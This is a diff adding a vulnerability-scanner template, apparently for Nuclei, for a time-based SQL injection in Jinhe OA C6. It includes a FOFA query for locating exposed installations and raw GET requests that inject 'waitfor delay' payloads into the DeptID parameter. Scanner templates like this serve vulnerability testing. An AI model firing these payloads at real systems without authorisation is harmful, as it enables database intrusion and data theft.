@@ -1,0 +1,23 @@
+id: jinhe-oa-c6-costperexpenddetail-sql-injection
+info:
+  name: 金和OA C6 CostPerExpendDetail接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+    该接口在处理参数时存在SQL注入缺陷，攻击者可通过构造恶意请求注入任意SQL语句，从而导致数据库敏感信息泄露或权限提升。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    GET /c6/JHSoft.Web.CostControl/Cost/CostPerApplyDetail.aspx/?DeptID=1'waitfor+delay+'0:0:5'--+ HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /c6/JHSoft.Web.CostControl/Cost/CostPerApplyDetail.aspx/?DeptID=1'waitfor+delay+'0:0:8'--+ HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
